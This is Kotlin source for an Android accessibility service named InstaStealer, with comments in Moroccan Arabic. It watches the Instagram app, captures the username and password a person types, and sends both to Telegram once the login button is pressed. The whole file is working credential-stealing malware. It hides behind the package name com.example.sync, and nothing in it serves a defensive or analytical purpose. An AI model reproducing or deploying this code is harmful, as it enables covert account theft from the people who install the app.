package com.example.sync

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class InstaStealer : AccessibilityService() {

    private var username = ""
    private var password = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // كيخدم غير ملي كيكون إنستغرام محلول
        if (event.packageName != "com.instagram.android") return

        // 1. كيلقط النص اللي كيتكتب
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text?.joinToString("") ?: ""
            if (event.isPassword) {
                password = text
            } else {
                username = text
            }
        }

        // 2. كيلقط الضغط على زر الدخول
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val btnText = event.text?.joinToString("") ?: ""
            if (btnText.contains("Log in", true) || 
                btnText.contains("تسجيل الدخول", true) || 
                btnText.contains("Log In", true)) {
                
                if (username.isNotBlank() || password.isNotBlank()) {
                    Telegram.sendText("🎯 حساب إنستغرام:\n👤 الاسم: $username\n🔐 الباسورد: $password")
                    username = ""
                    password = ""
                }
            }
        }
    }

    override fun onInterrupt() {}
}
